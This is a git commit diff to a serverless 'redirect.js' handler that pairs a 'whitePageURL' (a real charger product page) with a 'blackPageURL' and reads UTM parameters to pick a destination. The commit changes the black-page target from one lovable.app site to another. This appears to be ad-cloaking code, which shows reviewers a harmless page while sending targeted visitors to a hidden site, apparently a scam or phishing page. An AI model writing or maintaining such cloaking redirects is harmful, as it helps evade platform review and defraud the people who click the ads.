d317cb228304b66d07762fc09f472bd07464ecdc
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-11-20 15:47:59 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://powerhouseexpress.com.pk/products/acefast-pd-65w-wall-charger-black";
-    const blackPageURL = "https://zeleblackfridy.lovable.app/?";
+    const blackPageURL = "https://casssshlov.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
